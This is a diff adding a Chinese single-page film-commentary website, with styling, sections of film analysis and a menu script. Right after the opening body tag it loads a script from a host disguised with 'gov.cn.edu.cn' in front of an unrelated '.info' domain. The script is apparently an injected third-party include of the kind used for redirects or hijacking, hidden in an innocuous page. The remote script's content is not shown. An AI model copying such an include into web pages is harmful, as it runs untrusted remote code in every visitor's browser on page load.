@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>夸克电影网 | 把一部电影拆成可拼回的碎片</title>
+<meta name="description" content="夸克电影网（https://kuakedianyingwang-wap.github.io）是一份静态单页电影内容站，含碎片索引、颗粒片单、三幕拆解、亮度笔记四个栏目，以拆读、拼读为核心。">
+<meta name="keywords" content="夸克电影网, kuakedianyingwang-wap, 碎片索引, 颗粒片单, 三幕拆解, 拆读">
+<meta name="author" content="夸克电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#14110f">
+<meta property="og:type" content="website">
+<meta property="og:title" content="夸克电影网 | 把一部电影拆成可拼回的碎片">
+<meta property="og:description" content="碎片索引、颗粒片单、三幕拆解、亮度笔记：一份以拆读为核心、不堆数量的电影内容单页。">
+<meta property="og:url" content="https://kuakedianyingwang-wap.github.io">
+<meta property="og:site_name" content="夸克电影网">
+<link rel="canonical" href="https://kuakedianyingwang-wap.github.io">
+<style>
+*{box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  margin:0;font-size:16px;line-height:1.85;
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:#14110f;color:#f0e9df;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+:root{--max:1180px;--paper:#efe7d9;--ink:#14110f;--ink2:#221d18;--rust:#c6531e;--mustard:#e5b15b;--muted:#9a8e80;--line:#3a312a}
+
+/* ===== 噪点叠加 ===== */
+body::before{content:"";position:fixed;inset:0;pointer-events:none;z-index:999;opacity:.05;
+  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='160' height='160'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/></filter><rect width='100%' height='100%' filter='url(%23n)'/></svg>");}
+
+/* ===== 顶栏 ===== */
+.site-header{position:sticky;top:0;z-index:60;background:var(--ink);border-bottom:1px solid var(--line)}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 28px;height:70px;display:flex;align-items:center;justify-content:space-between;gap:20px}
+.brand{display:flex;align-items:center;gap:13px}
+.logo{width:42px;height:42px;background:var(--mustard);color:var(--ink);display:grid;place-items:center;font-weight:900;font-size:16px;letter-spacing:-1px}
+.brand b{font-size:18.5px;font-weight:900;letter-spacing:.5px}
+.brand em{font-style:normal;font-size:11.5px;letter-spacing:.5px;color:var(--muted)}
+.nav-links{display:flex;gap:4px}
+.nav-links a{padding:9px 13px;font-size:14.5px;border-radius:2px;color:#ddd2c2;transition:.2s}
+.nav-links a:hover{background:var(--rust);color:#fff}
+.menu-btn{display:none;width:44px;height:44px;background:var(--rust);color:#fff;border:0;border-radius:2px;font-size:18px;cursor:pointer;font-weight:900}
+
+/* ===== 通用 ===== */
+section{max-width:var(--max);margin:0 auto;padding:56px 28px}
+.sec-t{display:flex;align-items:baseline;gap:14px;margin-bottom:28px;flex-wrap:wrap;border-bottom:1px solid var(--line);padding-bottom:14px}
+.sec-t .no{font-size:11.5px;letter-spacing:2px;color:var(--mustard);font-family:"Courier New",monospace}
+.sec-t h2{margin:0;font-size:clamp(21px,3vw,29px);font-weight:900;letter-spacing:-.5px}
+.sec-t .more{margin-left:auto;font-size:13.5px;color:var(--mustard);border-bottom:1px solid var(--mustard);padding-bottom:2px}
+.sec-t .more:hover{color:#fff;border-color:#fff}
+
+/* ===== 封面 ===== */
+.cover{padding-top:44px}
+.hero{position:relative;border:1px solid var(--line);background:var(--ink2);overflow:hidden}
+.hero .glow{position:absolute;right:-90px;top:-90px;width:340px;height:340px;background:radial-gradient(circle,rgba(229,177,91,.32),transparent 65%);}
+.hero .glow2{position:absolute;left:-80px;bottom:-120px;width:300px;height:300px;background:radial-gradient(circle,rgba(198,83,30,.28),transparent 65%);}
+.hero .inner{position:relative;padding:54px 56px;display:grid;grid-template-columns:1.05fr .95fr;gap:44px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:11.5px;letter-spacing:3px;color:var(--mustard)}
+.hero h1{margin:16px 0 0;font-size:clamp(30px,5.6vw,55px);line-height:1.1;font-weight:900;letter-spacing:-1.5px}
+.hero h1 i{font-style:normal;color:var(--rust)}
+.hero p{margin:20px 0 0;font-size:clamp(15px,1.7vw,17px);max-width:52ch;color:#c9bda9}
+.acts{margin-top:26px;display:flex;flex-wrap:wrap;gap:12px}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:12px 24px;border-radius:2px;font-size:14.5px;cursor:pointer;border:1px solid var(--rust);background:var(--rust);color:#fff;transition:.2s;font-weight:800}
+.btn-o{background:transparent;border-color:#6c5d4c;color:#f0e9df}
+.btn:hover{background:var(--mustard);color:var(--ink);border-color:var(--mustard)}
+.chips{margin-top:26px;display:flex;flex-wrap:wrap;gap:8px}
+.chips span{font-size:12.5px;padding:6px 12px;border:1px solid var(--line);color:#ddd2c2}
+.shardbox{border:1px solid var(--line);padding:22px;background:rgba(20,17,15,.6)}
+.shardbox .h{font-family:"Courier New",monospace;font-size:11.5px;letter-spacing:2px;color:var(--mustard);margin-bottom:14px}
+.shard{height:56px;border:1px solid var(--line);margin-bottom:8px;position:relative;overflow:hidden}
+.shard:last-child{margin-bottom:0}
+.shard i{position:absolute;left:0;top:0;bottom:0;background:var(--rust);opacity:.85}
+.shard b{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:12.5px;color:#fff;letter-spacing:.5px;font-family:"Courier New",monospace}
+.shard em{position:absolute;right:12px;top:50%;transform:translateY(-50%);font-style:normal;font-size:11.5px;color:#ddd2c2}
+.shard.s2 i{background:var(--mustard)}
+.shard.s3 i{background:#7a8c63}
+
+/* ===== 碎片索引 拼图碎片 ===== */
+.frags{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:150px;gap:0}
+.frag{border:1px solid var(--line);padding:18px;position:relative;overflow:hidden;transition:.25s;cursor:default}
+.frag:hover{transform:scale(1.03);z-index:3;box-shadow:0 14px 30px rgba(0,0,0,.55)}
+.frag .t{font-family:"Courier New",monospace;font-size:11px;letter-spacing:2px;opacity:.75}
+.frag h4{margin:8px 0 0;font-size:17px;font-weight:850;line-height:1.4}
+.frag p{margin:8px 0 0;font-size:13px;color:#c3b7a4;line-height:1.7}
+.frag .sz{position:absolute;right:14px;bottom:10px;font-family:"Courier New",monospace;font-size:10.5px;opacity:.6}
+.f1{background:var(--rust);grid-row:span 2}
+.f2{background:#2a241e}
+.f3{background:var(--mustard);color:var(--ink)}
+.f3 p{color:#4a4137}
+.f4{background:#3b332b}
+.f5{background:#1f2a26}
+.f6{background:#c6531e;grid-column:span 2}
+.f6 h4{font-size:21px}
+.f7{background:#e5b15b;color:var(--ink);grid-row:span 2}
+.f7 p{color:#4a4137}
+.f8{background:#2a241e}
+.f9{background:#6e3a1c;grid-column:span 2;grid-row:span 2}
+
+/* ===== 颗粒片单 列表行 ===== */
+.grains{border:1px solid var(--line);background:var(--ink2)}
+.grain{display:grid;grid-template-columns:74px 1fr 200px 96px;align-items:center;padding:18px 24px;border-bottom:1px solid var(--line);transition:.2s}
+.grain:last-child{border-bottom:0}
+.grain:hover{background:#251f19}
+.grain .dot{width:22px;height:22px;border-radius:50%;background:var(--rust)}
+.grain:nth-child(3n) .dot{background:var(--mustard)}
+.grain:nth-child(5n) .dot{background:#7a8c63}
+.grain .num{font-family:"Courier New",monospace;font-size:21px;font-weight:900;color:#6c5d4c}
+.grain h4{margin:0;font-size:17px;font-weight:850}
+.grain small{display:block;margin-top:3px;font-size:13px;color:var(--muted)}
+.grain .px{display:flex;gap:5px}
+.grain .px i{width:14px;height:14px;background:#3a312a}
+.grain .px i.on{background:var(--rust)}
+.grain .px i.on2{background:var(--mustard)}
+.grain .tag{font-size:12.5px;text-align:right;color:#c9bda9;border:1px solid var(--line);padding:5px 10px;justify-self:end}
+
+/* ===== 三幕拆解 横向流程 ===== */
+.acts3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+.act{border-top:5px solid var(--rust);padding:24px;background:var(--ink2);transition:.25s}
+.act:hover{background:#251f19}
+.act.a2{border-color:var(--mustard)}
+.act.a3{border-color:#7a8c63}
+.act .lab{font-family:"Courier New",monospace;font-size:11.5px;letter-spacing:2px;color:var(--rust)}
+.act.a2 .lab{color:var(--mustard)}
+.act.a3 .lab{color:#9fb386}
+.act h4{margin:8px 0 10px;font-size:19px;font-weight:900}
+.act p{margin:0;font-size:14.5px;color:#c3b7a4;line-height:1.85}
+.act ol{margin:14px 0 0;padding-left:20px;font-size:14px;color:#c3b7a4}
+.act ol li{margin-bottom:6px}
+.act .fill{margin-top:16px;height:8px;background:#3a312a;position:relative;overflow:hidden}
+.act .fill i{position:absolute;left:0;top:0;bottom:0;background:var(--rust)}
+.act.a2 .fill i{background:var(--mustard)}
+.act.a3 .fill i{background:#7a8c63}
+
+/* ===== 亮度笔记 左右交错 ===== */
+.notes{display:flex;flex-direction:column;gap:18px}
+.note{display:grid;grid-template-columns:120px 1fr;gap:26px;padding:24px;border:1px solid var(--line);background:var(--ink2)}
+.note:nth-child(even){grid-template-columns:1fr 120px}
+.note:nth-child(even) .bar{order:2}
+.note .bar{background:#2a241e;padding:16px;border-left:4px solid var(--mustard)}
+.note .bar b{display:block;font-family:"Courier New",monospace;font-size:22px;color:var(--mustard)}
+.note .bar span{font-size:12px;color:var(--muted)}
+.note h4{margin:0 0 8px;font-size:17.5px;font-weight:850}
+.note p{margin:0;font-size:14.5px;color:#c3b7a4;line-height:1.9}
+
+/* ===== 关于 ===== */
+.about{border:1px solid var(--line);padding:34px 38px;background:var(--paper);color:var(--ink)}
+.about p{margin:0 0 12px;font-size:15.5px;line-height:1.95}
+.about p:last-child{margin-bottom:0}
+.about p strong{color:var(--rust)}
+.about .grid{margin-top:24px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px}
+.about .grid a{padding:14px;border:1px solid #c3b39c;font-size:13.5px;font-weight:700;text-align:center;transition:.2s}
+.about .grid a:hover{background:var(--rust);color:#fff;border-color:var(--rust)}
+
+/* ===== footer ===== */
+.site-footer{border-top:1px solid var(--line);padding:30px 28px 40px;font-size:13.5px;color:var(--muted);background:#0d0b0a}
+.site-footer .in{max-width:var(--max);margin:0 auto;display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.site-footer a{color:var(--muted)}
+.site-footer a:hover{color:#fff}
+
+@media (max-width:1000px){
+  .hero .inner{grid-template-columns:1fr}
+  .frags{grid-template-columns:repeat(3,1fr)}
+  .f6,.f9{grid-column:span 2}
+  .grain{grid-template-columns:52px 1fr 84px;grid-template-areas:"n t p" "n g x";row-gap:8px}
+  .grain .num{grid-area:n}
+  .grain h4{grid-area:t}
+  .grain .px{grid-area:g}
+  .grain .tag{grid-area:x;justify-self:start}
+  .acts3{grid-template-columns:1fr}
+  .note,.note:nth-child(even){grid-template-columns:1fr}
+  .note .bar{order:0}
+  .about .grid{grid-template-columns:repeat(2,1fr)}
+}
+@media (max-width:640px){
+  .wrap{height:56px;padding:0 14px}
+  .brand b{font-size:15.5px}
+  .brand em{display:none}
+  .menu-btn{display:inline-flex;align-items:center;justify-content:center}
+  .nav-links{position:fixed;top:56px;left:0;right:0;flex-direction:column;background:var(--ink);padding:10px;border-top:1px solid var(--line);clip-path:inset(0 0 100% 0);transition:.28s ease}
+  .nav-links.open{clip-path:inset(0 0 0 0)}
+  section{padding:42px 14px}
+  .cover{padding-top:24px}
+  .hero .inner{padding:34px 22px;gap:28px}
+  .frags{grid-template-columns:1fr 1fr;grid-auto-rows:auto}
+  .f1,.f7,.f9{grid-row:span 1}
+  .f6,.f9{grid-column:span 2}
+  .grain{grid-template-columns:40px 1fr;grid-template-areas:"n t" "n g";padding:16px}
+  .grain .tag{display:none}
+  .about{padding:26px 20px}
+  .about .grid{grid-template-columns:1fr}
+}
+@media print{body{background:#fff;color:#000}.site-header,.menu-btn,.acts,.site-footer{display:none}section{page-break-inside:avoid}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="site-header">
+  <div class="wrap">
+    <div class="brand">
+      <div class="logo">夸</div>
+      <div>
+        <b>夸克电影网</b>
+        <em>kuakedianyingwang-wap.github.io</em>
+      </div>
+    </div>
+    <nav class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#frags">碎片索引</a>
+      <a href="#grains">颗粒片单</a>
+      <a href="#acts">三幕拆解</a>
+      <a href="#notes">亮度笔记</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn" aria-label="打开菜单">☰</button>
+  </div>
+</header>
+
+<main>
+
+  <!-- ===== 封面 ===== -->
+  <section class="cover" id="home">
+    <div class="hero">
+      <div class="glow"></div><div class="glow2"></div>
+      <div class="inner">
+        <div>
+          <div class="kicker">QUARK MOVIE NET · PIECE BY PIECE</div>
+          <h1>把一部电影<br>拆成 <i>可拼回</i> 的碎片</h1>
+          <p>夸克电影网是一份静态单页电影内容站。网站网址：https://kuakedianyingwang-wap.github.io。不堆数量，只做拆读与拼读：一片一析，一幕一问。</p>
+          <div class="acts">
+            <a class="btn" href="#frags">进入碎片索引</a>
+            <a class="btn btn-o" href="#grains">颗粒片单</a>
+          </div>
+          <div class="chips">
+            <span>#拆读</span><span>#拼读</span><span>#单页</span><span>#原创内容</span><span>#不提供片源</span>
+          </div>
+        </div>
+        <div class="shardbox">
+          <div class="h">拆解预览 · 一部片 = 4 片</div>
+          <div class="shard"><i style="width:30%"></i><b>01 开场</b><em>0:00—0:12</em></div>
+          <div class="shard s2"><i style="width:48%"></i><b>02 转向</b><em>0:12—0:41</em></div>
+          <div class="shard s3"><i style="width:70%"></i><b>03 失控</b><em>0:41—1:05</em></div>
+          <div class="shard"><i style="width:88%"></i><b>04 收束</b><em>1:05—1:38</em></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== 碎片索引 ===== -->
+  <section id="frags">
+    <div class="sec-t">
+      <span class="no">01 / FRAGMENT INDEX</span>
+      <h2>碎片索引</h2>
+      <a class="more" href="#">全部碎片 #</a>
+    </div>
+    <div class="frags">
+      <div class="frag f1"><div class="t">FRAG 01</div><h4>镜头先开口，台词后到</h4><p>开场两分钟不用一句话讲完身份，是更尊重观众的写法。</p><div class="sz">12 片</div></div>
+      <div class="frag f2"><div class="t">FRAG 02</div><h4>房间即性格</h4><p>桌面、门框、灯光，三处细节足够判断这个人。</p><div class="sz">08 片</div></div>
+      <div class="frag f3"><div class="t">FRAG 03</div><h4>沉默比台词贵</h4><p>停顿不是没话讲，是把决定权交给你。</p><div class="sz">15 片</div></div>
+      <div class="frag f4"><div class="t">FRAG 04</div><h4>走位即关系</h4><p>谁先离开画面，谁就在那场戏里输了。</p><div class="sz">06 片</div></div>
+      <div class="frag f5"><div class="t">FRAG 05</div><h4>声音替你记住</h4><p>看完三天还能回响的，多半是音效。</p><div class="sz">09 片</div></div>
+      <div class="frag f6"><div class="t">FRAG 06 · 长条</div><h4>颜色是提前说出口的台词</h4><p>主色一旦定下，后续每一次变调都在推进情绪，不必额外解释。</p><div class="sz">11 片</div></div>
+      <div class="frag f7"><div class="t">FRAG 07</div><h4>失败比成功好看</h4><p>人物算错的那一步，往往才是全片最值钱的一格。</p><div class="sz">07 片</div></div>
+      <div class="frag f8"><div class="t">FRAG 08</div><h4>结尾敢留白</h4><p>给答案容易，给问题难，也更耐看。</p><div class="sz">10 片</div></div>
+      <div class="frag f9"><div class="t">FRAG 09 · 焦点</div><h4>拆开看，是为了能重新拼回去</h4><p>读碎片不是挑错，是看清结构，再判断它值不值得你完整再看一遍。</p><div class="sz">04 片</div></div>
+    </div>
+  </section>
+
+  <!-- ===== 颗粒片单 ===== -->
+  <section id="grains" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">02 / GRAIN LIST</span>
+      <h2>颗粒片单</h2>
+      <a class="more" href="#">扩展片单 #</a>
+    </div>
+    <div class="grains">
+      <div class="grain"><div class="num">01</div><div><h4>开场即交代结局的片</h4><small>看点：倒叙不是炫技，是重定节奏</small></div><div class="px"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i></i></div><div class="tag">重看首选</div></div>
+      <div class="grain"><div class="num">02</div><div><h4>一句话能讲完的片</h4><small>看点：叙事极简，靠调度撑住</small></div><div class="px"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></div><div class="tag">入门</div></div>
+      <div class="grain"><div class="num">03</div><div><h4>声音比画面先到的片</h4><small>看点：声音设计作为叙事主线</small></div><div class="px"><i class="on2"></i><i class="on2"></i><i class="on2"></i><i class="on2"></i><i class="on2"></i></div><div class="tag">戴耳机</div></div>
+      <div class="grain"><div class="num">04</div><div><h4>空间成为主角的片</h4><small>看点：城市、房间、走廊都是人物</small></div><div class="px"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i></i></div><div class="tag">空间感</div></div>
+      <div class="grain"><div class="num">05</div><div><h4>允许主角不体面的片</h4><small>看点：人物的尴尬比光环更可信</small></div><div class="px"><i class="on"></i><i class="on"></i><i class="on"></i><i></i><i></i></div><div class="tag">人物</div></div>
+      <div class="grain"><div class="num">06</div><div><h4>结尾敢于不圆的片</h4><small>看点：未完成感如何支撑整体</small></div><div class="px"><i class="on2"></i><i class="on2"></i><i class="on2"></i><i class="on2"></i><i></i></div><div class="tag">值得讨论</div></div>
+      <div class="grain"><div class="num">07</div><div><h4>短片优先的片单</h4><small>看点：十几分钟里建立完整人物</small></div><div class="px"><i class="on"></i><i class="on"></i><i></i><i></i><i></i></div><div class="tag">短片</div></div>
+      <div class="grain"><div class="num">08</div><div><h4>剪辑替你呼吸的片</h4><small>看点：剪点本身就是观点</small></div><div class="px"><i class="on2"></i><i class="on2"></i><i class="on2"></i><i class="on2"></i><i class="on2"></i></div><div class="tag">技法</div></div>
+      <div class="grain"><div class="num">09</div><div><h4>看完想写点的片</h4><small>看点：能复述才算真正留下</small></div><div class="px"><i class="on"></i><i class="on"></i><i class="on"></i><i class="on"></i><i></i></div><div class="tag">写作素材</div></div>
+    </div>
+  </section>
+
+  <!-- ===== 三幕拆解 ===== -->
+  <section id="acts" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">03 / THREE ACTS</span>
+      <h2>三幕拆解</h2>
+      <a class="more" href="#">拆解模板 #</a>
+    </div>
+    <div class="acts3">
+      <div class="act a1">
+        <div class="lab">ACT ONE · 开场</div>
+        <h4>先把人留住</h4>
+        <p>前十五分钟只做两件事：让人认出人物，让人察觉有东西要失衡。</p>
+        <ol><li>第一个画面在说什么</li><li>人物缺什么</li><li>失衡点在哪</li><li>谁先主动</li></ol>
+        <div class="fill"><i style="width:22%"></i></div>
+      </div>
+      <div class="act a2">
+        <div class="lab">ACT TWO · 中段</div>
+        <h4>反复打偏，才见人物</h4>
+        <p>中段不是拖长，是让每次尝试都错一点点，人物的形状由此显出来。</p>
+        <ol><li>主行动被挡几次</li><li>关系如何位移</li><li>哪场戏最静</li><li>信息何时才补齐</li></ol>
+        <div class="fill"><i style="width:56%"></i></div>
+      </div>
+      <div class="act a3">
+        <div class="lab">ACT THREE · 收束</div>
+        <h4>收得住，才值钱</h4>
+        <p>结尾要兑现中段埋下的东西，而不是另起一个惊喜去讨好观众。</p>
+        <ol><li>兑现了哪一句</li><li>谁改变了谁</li><li>留白给什么</li><li>你愿不愿重看</li></ol>
+        <div class="fill"><i style="width:90%"></i></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ===== 亮度笔记 ===== -->
+  <section id="notes" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">04 / BRIGHTNESS NOTES</span>
+      <h2>亮度笔记</h2>
+      <a class="more" href="#">更多笔记 #</a>
+    </div>
+    <div class="notes">
+      <div class="note"><div class="bar"><b>07</b><span>亮度偏低</span></div><div><h4>暗不代表深沉，光才代表情绪</h4><p>判断一部片亮不亮，别只看曝光。人物脸上那一点点光，往往就是导演的态度所在。</p></div></div>
+      <div class="note"><div class="bar"><b>12</b><span>中亮度</span></div><div><h4>平光也能有张力</h4><p>不靠阴影造悬念时，表演和走位必须顶上，这是最考验功力的一类片子。</p></div></div>
+      <div class="note"><div class="bar"><b>15</b><span>亮度偏高</span></div><div><h4>过曝有时是诚实</h4><p>白到失去细节，可能是记忆、幻觉，也可能是创作者承认自己只能讲到这里。</p></div></div>
+    </div>
+  </section>
+
+  <!-- ===== 关于 ===== -->
+  <section id="about" style="padding-top:0">
+    <div class="sec-t">
+      <span class="no">ABOUT</span>
+      <h2 style="color:#14110f">关于本站</h2>
+      <a class="more" href="#">联系 #</a>
+    </div>
+    <div class="about">
+      <p><strong>网站名称：夸克电影网</strong>　<strong>网站网址：https://kuakedianyingwang-wap.github.io</strong></p>
+      <p>本站是一份静态单页电影内容站，栏目包括碎片索引、颗粒片单、三幕拆解与亮度笔记，内容定位为拆读与拼读，不做泛泛的榜单与数量堆砌。</p>
+      <p>本站不提供任何在线播放、下载或盗版资源链接；影片名称与片段描述仅用于评论、研究与个人推荐。本页为单页站点，栏目以锚点定位，内页占位链接以 # 表示，未生成 robots.txt 与 sitemap.xml。</p>
+      <div class="grid">
+        <a href="#">碎片索引 #</a><a href="#">颗粒片单 #</a><a href="#">三幕拆解 #</a><a href="#">亮度笔记 #</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div class="in">
+    <div>© 2026 夸克电影网 · 网站名称：夸克电影网 · 网站网址：https://kuakedianyingwang-wap.github.io · 内容仅供学习与讨论</div>
+    <div><a href="#">返回首页 #</a></div>
+  </div>
+</footer>
+
+<script>
+(function(){
+  var btn=document.getElementById('menuBtn'),nav=document.getElementById('navLinks');
+  if(!btn||!nav)return;
+  btn.addEventListener('click',function(){nav.classList.toggle('open');});
+  nav.addEventListener('click',function(e){if(e.target.tagName==='A')nav.classList.remove('open');});
+})();
+</script>
+</body>
+</html>
